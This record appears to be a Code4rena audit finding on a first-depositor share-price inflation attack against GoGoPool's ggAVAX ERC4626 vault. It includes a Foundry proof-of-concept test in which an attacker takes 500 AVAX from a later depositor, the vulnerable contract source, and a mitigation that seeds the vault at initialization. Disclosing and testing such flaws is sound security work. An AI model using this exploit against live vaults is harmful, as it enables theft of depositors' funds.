{
  "Title": "[H-05] Inflation of ggAVAX share price by first depositor",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123\n\n\n# Vulnerability details\n\n## Impact\n\nInflation of `ggAVAX` share price can be done by depositing as soon as the vault is created.\n\nImpact:\n1. Early depositor will be able steal other depositors funds\n2. Exchange rate is inflated. As a result depositors are not able to deposit small funds.\n\n## Proof of Concept\n\nIf `ggAVAX` is not seeded as soon as it is created, a malicious depositor can deposit 1 WEI of AVAX to receive 1 share. \nThe depositor can donate WAVAX to the vault and call `syncRewards`. This will start inflating the price.\n\nWhen the attacker front-runs the creation of the vault, the attacker: \n1. Calls `depositAVAX` to receive 1 share\n2. Transfers `WAVAX` to `ggAVAX`\n3. Calls `syncRewards` to inflate exchange rate\n\nThe issue exists because the exchange rate is calculated as the ratio between the `totalSupply` of shares and the `totalAssets()`.\nWhen the attacker transfers `WAVAX` and calls `syncRewards()`, the `totalAssets()` increases gradually and therefore the exchange rate also increases.\n\n`convertToShares `:\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123\n```\n\tfunction convertToShares(uint256 assets) public view virtual returns (uint256) {\n\t\tuint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n\t\treturn supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());\n\t}\n```\n\nIts important to note that while it is true that cycle length is 14 days, in practice time between cycles can very between 0-14 days.\nThis is because syncRewards validates that the next reward cycle is evenly divided by the length (14 days).\n\n`syncRewards`:\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L102\n```\n\tfunction syncRewards() public {\n----------\n\t\t// Ensure nextRewardsCycleEnd will be evenly divisible by `rewardsCycleLength`.\n\t\tuint32 nextRewardsCycleEnd = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;\n---------\n\t}\n```\n\nTherefore:\n- The closer the call to `syncRewards` is to the next evenly divisible value of `rewardsCycleLength`, the closer the next  `rewardsCycleEnd` will be. \n- The closer the delta between `syncRewards` calls is, the higher revenue the attacker will get.\n\nEdge case example: \n`syncRewards` is called with the timestamp 1672876799, `syncRewards` will be able to be called again 1 second later.\n`(1672876799 + 14 days) / 14 days) * 14 days) = 1672876800`\n\nAdditionally, the price inflation causes a revert for users who want to deposit less then the donation (WAVAX transfer) amount, due to precision rounding when depositing.\n\n`depositAVAX`:\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166\n```\n\tfunction depositAVAX() public payable returns (uint256 shares) {\n------\n\t\tif ((shares = previewDeposit(assets)) == 0) {\n\t\t\trevert ZeroShares();\n\t\t}\n------\n\t}\n```\n\n`previewDeposit` and `convertToShares `:\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L133\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123\n```\n\tfunction convertToShares(uint256 assets) public view virtual returns (uint256) {\n\t\tuint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n\t\treturn supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());\n\t}\n\tfunction previewDeposit(uint256 assets) public view virtual returns (uint256) {\n\t\treturn convertToShares(assets);\n\t}\n```\n\n### Foundry POC\n\nThe POC will demonstrate the below scenario:\n1. Bob front-runs the vault creation.\n2. Bob deposits 1 WEI of AVAX to the vault.\n3. Bob transfers 1000 WAVAX to the vault.\n4. Bob calls `syncRewards` when block.timestamp = `1672876799`.\n5. Bob waits 1 second.\n6. Bob calls `syncRewards` again. Share price fully inflated.\n7. Alice deposits 2000 AVAX to vault.\n8. Bob withdraws 1500 AVAX (steals 500 AVAX from Alice).\n9. Alice share earns her 1500 AVAX (although she deposited 2000).\n\nAdditionally, the POC will show that depositors trying to deposit less then the donation amount will revert. \n\nAdd the following test to `TokenggAVAX.t.sol`:\nhttps://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/TokenggAVAX.t.sol#L108\n```\n\tfunction testShareInflation() public {\n\t\tuint256 depositAmount = 1;\n\t\tuint256 aliceDeposit = 2000 ether;\n\t\tuint256 donationAmount = 1000 ether;\n\t\tvm.deal(bob, donationAmount  + depositAmount);\n\t\tvm.deal(alice, aliceDeposit);\n\t\tvm.warp(1672876799);\n\n\t\t// create new ggAVAX\n\t\tggAVAXImpl = new TokenggAVAX();\n\t\tggAVAX = TokenggAVAX(deployProxy(address(ggAVAXImpl), address(guardian)));\n\t\tggAVAX.initialize(store, ERC20(address(wavax)));\n\n\t\t// Bob deposits 1 WEI of AVAX\n\t\tvm.prank(bob);\n\t\tggAVAX.depositAVAX{value: depositAmount}();\n\t\t// Bob transfers 1000 AVAX to vault\n\t\tvm.startPrank(bob);\n\t\twavax.deposit{value: donationAmount}();\n\t\twavax.transfer(address(ggAVAX), donationAmount);\n\t\tvm.stopPrank();\n\t\t// Bob Syncs rewards\n\t\tggAVAX.syncRewards();\n\n\t\t// 1 second has passed\n\t\t// This can range between 0-14 days. Every seconds, exchange rate rises\n\t\tskip(1 seconds);\n\n\t\t// Alice deposits 2000 AVAX\n\t\tvm.prank(alice);\n\t\tggAVAX.depositAVAX{value: aliceDeposit}();\n\n\t\t//Expectet revert when any depositor deposits less then 1000 AVAX\n\t\tvm.expectRevert(bytes4(keccak256(\"ZeroShares()\")));\n\t\tggAVAX.depositAVAX{value: 10 ether}();\n\n\t\t// Bob withdraws maximum assests for his share\n\t\tuint256 maxWithdrawAssets = ggAVAX.maxWithdraw(bob);\n\t\tvm.prank(bob);\n\t\tggAVAX.withdrawAVAX(maxWithdrawAssets);\n\n\t\t//Validate bob has withdrawn 1500 AVAX \n\t\tassertEq(bob.balance, 1500 ether);\n\n\t\t// Alice withdraws maximum assests for her share\n\t\tmaxWithdrawAssets = ggAVAX.maxWithdraw(alice);\n\t\tggAVAX.syncRewards(); // to update accounting\n\t\tvm.prank(alice);\n\t\tggAVAX.withdrawAVAX(maxWithdrawAssets);\n\n\t\t// Validate that Alice withdraw 1500 AVAX + 1 (~500 AVAX loss)\n\t\tassertEq(alice.balance, 1500 ether + 1);\n\t}\n```\n\nTo run the POC, execute:\n```\nforge test -m testShareInflation -v\n```\n\nExpected output:\n```\nRunning 1 test for test/unit/TokenggAVAX.t.sol:TokenggAVAXTest\n[PASS] testShareInflation() (gas: 3874399)\nTest result: ok. 1 passed; 0 failed; finished in 8.71s\n```\n\n## Tools Used\n\nVS Code, Foundry\n\n## Recommended Mitigation Steps\n\nWhen creating the vault add initial funds in order to make it harder to inflate the price. \nBest practice would add initial funds as part of the initialization of the contract (to prevent front-running).",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-12-gogopool-contest",
  "Code": [
    {
      "filename": "contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\nimport {ERC20Upgradeable} from \"./ERC20Upgradeable.sol\";\n\nimport {ERC20} from \"@rari-capital/solmate/src/tokens/ERC20.sol\";\nimport {FixedPointMathLib} from \"@rari-capital/solmate/src/utils/FixedPointMathLib.sol\";\nimport {SafeTransferLib} from \"@rari-capital/solmate/src/utils/SafeTransferLib.sol\";\nimport {Initializable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\n\nabstract contract ERC4626Upgradeable is Initializable, ERC20Upgradeable {\n\tusing SafeTransferLib for ERC20;\n\tusing FixedPointMathLib for uint256;\n\n\t/*//////////////////////////////////////////////////////////////\n\t\tEVENTS\n\t//////////////////////////////////////////////////////////////*/\n\n\tevent Deposit(address indexed caller, address indexed owner, uint256 assets, uint256 shares);\n\n\tevent Withdraw(address indexed caller, address indexed receiver, address indexed owner, uint256 assets, uint256 shares);\n\n\t/*//////////////////////////////////////////////////////////////\n\t\tIMMUTABLES\n\t\t//////////////////////////////////////////////////////////////*/\n\n\tERC20 public asset;\n\n\tfunction __ERC4626Upgradeable_init(\n\t\tERC20 _asset,\n\t\tstring memory _name,\n\t\tstring memory _symbol\n\t) internal onlyInitializing {\n\t\t__ERC20Upgradeable_init(_name, _symbol, _asset.decimals());\n\t\tasset = _asset;\n\t}\n\n\t/*//////////////////////////////////////////////////////////////\n\t\t\tDEPOSIT/WITHDRAWAL LOGIC\n\t\t//////////////////////////////////////////////////////////////*/\n\n\tfunction deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {\n\t\t// Check for rounding error since we round down in previewDeposit.\n\t\trequire((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");\n\n\t\t// Need to transfer before minting or ERC777s could reenter.\n\t\tasset.safeTransferFrom(msg.sender, address(this), assets);\n\n\t\t_mint(receiver, shares);\n\n\t\temit Deposit(msg.sender, receiver, assets, shares);\n\n\t\tafterDeposit(assets, shares);\n\t}\n\n\tfunction mint(uint256 shares, address receiver) public virtual returns (uint256 assets) {\n\t\tassets = previewMint(shares); // No need to check for rounding error, previewMint rounds up.\n\n\t\t// Need to transfer before minting or ERC777s could reenter.\n\t\tasset.safeTransferFrom(msg.sender, address(this), assets);\n\n\t\t_mint(receiver, shares);\n\n\t\temit Deposit(msg.sender, receiver, assets, shares);\n\n\t\tafterDeposit(assets, shares);\n\t}\n\n\tfunction withdraw(\n\t\tuint256 assets,\n\t\taddress receiver,\n\t\taddress owner\n\t) public virtual returns (uint256 shares) {\n\t\tshares = previewWithdraw(assets); // No need to check for rounding error, previewWithdraw rounds up.\n\n\t\tif (msg.sender != owner) {\n\t\t\tuint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n\t\t\tif (allowed != type(uint256).max) allowance[owner][msg.sender] = allowed - shares;\n\t\t}\n\n\t\tbeforeWithdraw(assets, shares);\n\n\t\t_burn(owner, shares);\n\n\t\temit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n\t\tasset.safeTransfer(receiver, assets);\n\t}\n\n\tfunction redeem(\n\t\tuint256 shares,\n\t\taddress receiver,\n\t\taddress owner\n\t) public virtual returns (uint256 assets) {\n\t\tif (msg.sender != owner) {\n\t\t\tuint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n\t\t\tif (allowed != type(uint256).max) allowance[owner][msg.sender] = allowed - shares;\n\t\t}\n\n\t\t// Check for rounding error since we round down in previewRedeem.\n\t\trequire((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");\n\n\t\tbeforeWithdraw(assets, shares);\n\n\t\t_burn(owner, shares);\n\n\t\temit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n\t\tasset.safeTransfer(receiver, assets);\n\t}\n\n\t/*//////////////////////////////////////////////////////////////\n\t\tACCOUNTING LOGIC\n\t//////////////////////////////////////////////////////////////*/\n\n\tfunction totalAssets() public view virtual returns (uint256);\n\n\tfunction convertToShares(uint256 assets) public view virtual returns (uint256) {\n\t\tuint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n\t\treturn supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());\n\t}\n\n\tfunction convertToAssets(uint256 shares) public view virtual returns (uint256) {\n\t\tuint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n\t\treturn supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply);\n\t}\n\n\tfunction previewDeposit(uint256 assets) public view virtual returns (uint256) {\n\t\treturn convertToShares(assets);\n\t}\n\n\tfunction previewMint(uint256 shares) public view virtual returns (uint256) {\n\t\tuint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n\t\treturn supply == 0 ? shares : shares.mulDivUp(totalAssets(), supply);\n\t}\n\n\tfunction previewWithdraw(uint256 assets) public view virtual returns (uint256) {\n\t\tuint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n\t\treturn supply == 0 ? assets : assets.mulDivUp(supply, totalAssets());\n\t}\n\n\tfunction previewRedeem(uint256 shares) public view virtual returns (uint256) {\n\t\treturn convertToAssets(shares);\n\t}\n\n\t/*//////////////////////////////////////////////////////////////\n\t\tDEPOSIT/WITHDRAWAL LIMIT LOGIC\n\t//////////////////////////////////////////////////////////////*/\n\n\tfunction maxDeposit(address) public view virtual returns (uint256) {\n\t\treturn type(uint256).max;\n\t}\n\n\tfunction maxMint(address) public view virtual returns (uint256) {\n\t\treturn type(uint256).max;\n\t}\n\n\tfunction maxWithdraw(address owner) public view virtual returns (uint256) {\n\t\treturn convertToAssets(balanceOf[owner]);\n\t}\n\n\tfunction maxRedeem(address owner) public view virtual returns (uint256) {\n\t\treturn balanceOf[owner];\n\t}\n\n\t/*//////////////////////////////////////////////////////////////\n\t\tINTERNAL HOOKS LOGIC\n\t//////////////////////////////////////////////////////////////*/\n\n\tfunction beforeWithdraw(uint256 assets, uint256 shares) internal virtual {}\n\n\tfunction afterDeposit(uint256 assets, uint256 shares) internal virtual {}\n}"
    }
  ]
}